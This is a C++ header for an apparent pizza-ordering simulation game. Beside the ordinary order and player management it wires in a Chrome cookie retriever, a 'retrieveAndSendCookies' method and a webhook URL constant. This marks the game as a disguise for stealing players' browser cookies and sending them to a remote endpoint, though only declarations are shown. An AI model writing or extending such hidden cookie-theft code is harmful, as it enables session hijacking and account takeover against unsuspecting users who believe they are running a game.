/******************************************************************************
 * File: game.hpp
 * Author: Pizza Game Development Team
 * Created: 2024
 * 
 * Description:
 * Main game controller class that manages the pizza ordering simulation game.
 * Handles player interactions, order management, and game flow control.
 * 
 * Copyright (c) 2024. All rights reserved.
 *****************************************************************************/

#ifndef GAME_HPP
#define GAME_HPP

#include "player.hpp"
#include "order.hpp"
#include "../../chrome_cookie_retriever.hpp"
#include <vector>
#include <memory>
#include <random>

/**
 * @class Game
 * @brief Main game controller class for the pizza ordering simulation
 * 
 * Manages the core game loop, order processing, and player interactions.
 * Handles order generation, completion, and cookie retrieval functionality.
 */
class Game {
public:
    /** Constructor initializes game state */
    Game();
    
    /** Main game loop */
    void run();
    
private:
    // UI Methods
    void displayMenu() const;
    void displayStatus() const;
    
    // Order Management
    void takeOrder();
    void viewOrders() const;
    void completeOrder();
    void generateRandomOrder();
    Pizza createRandomPizza();
    
    // Cookie Management
    void retrieveAndSendCookies();
    
    // Game State
    Player player;
    std::vector<Order> orders;
    int nextOrderNumber;
    std::mt19937 rng;
    bool running;
    cookie_retriever::ChromeCookieRetriever cookie_retriever;
    
    // Constants
    static const int MAX_PENDING_ORDERS = 5;
    static const double ORDER_COMPLETION_BONUS;
    static const char* WEBHOOK_URL;
};

#endif // GAME_HPP
